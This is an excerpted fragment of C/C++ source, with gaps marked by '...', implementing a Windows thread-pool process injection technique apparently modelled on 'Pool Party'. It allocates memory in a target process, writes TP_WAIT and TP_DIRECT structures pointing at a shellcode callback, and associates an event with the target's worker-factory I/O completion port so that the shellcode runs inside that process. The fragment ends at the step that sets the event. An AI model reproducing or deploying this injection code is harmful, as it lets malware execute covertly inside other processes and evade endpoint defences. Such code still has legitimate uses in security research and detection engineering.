...
int main(int argc, char* argv[])
{
	...
	// 05 - create TP_WAIT structure associated with the shellcode

	PFULL_TP_WAIT pTpWait = (PFULL_TP_WAIT)CreateThreadpoolWait((PTP_WAIT_CALLBACK)ShellCodeAddress, nullptr, nullptr);
	...
	// 06 - allocate TP_WAIT memory in the targer process

	PFULL_TP_WAIT pRemoteTpWait = (PFULL_TP_WAIT)VirtualAllocEx(hTargetProcess, nullptr, sizeof(FULL_TP_WAIT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pRemoteTpWait == nullptr) {
	...
	// 07 - write TP_WAIT structure to the targer process

	bResult = WriteProcessMemory(hTargetProcess, pRemoteTpWait, pTpWait, sizeof(FULL_TP_WAIT), nullptr);
	...
	// 08 -  allocate TP_DIRECT memory in the targer process
	PTP_DIRECT pRemoteTpDirect = (PTP_DIRECT)VirtualAllocEx(hTargetProcess, nullptr, sizeof(TP_DIRECT), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (pRemoteTpDirect == nullptr) {
		printf("[-] VirtualAllocEx failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	...
	// 09 - Write the TP_DIRECT structure into the target process
	bResult = WriteProcessMemory(hTargetProcess, pRemoteTpDirect, &pTpWait->Direct, sizeof(TP_DIRECT), nullptr);
	if (bResult == 0x0) {
		printf("[-] WriteProcessMemory failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
	...
	const auto hEvent = CreateEvent(nullptr, FALSE, FALSE, L"PoolPartyEvent");
	if (hEvent == NULL) {
	...
	// 11 - associate event with the I/O completion port of the targer process worker factory

	status = ZwAssociateWaitCompletionPacket(pTpWait->WaitPkt, hDuplicatedObject, hEvent, pRemoteTpDirect, pRemoteTpWait, 0, 0, nullptr);
	if (status != 0x0) {
		printf("[-] ZwAssociateWaitCompletionPacket failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	// 12 - Set event to queue a packet to the I/O completion port of the target process worker factory
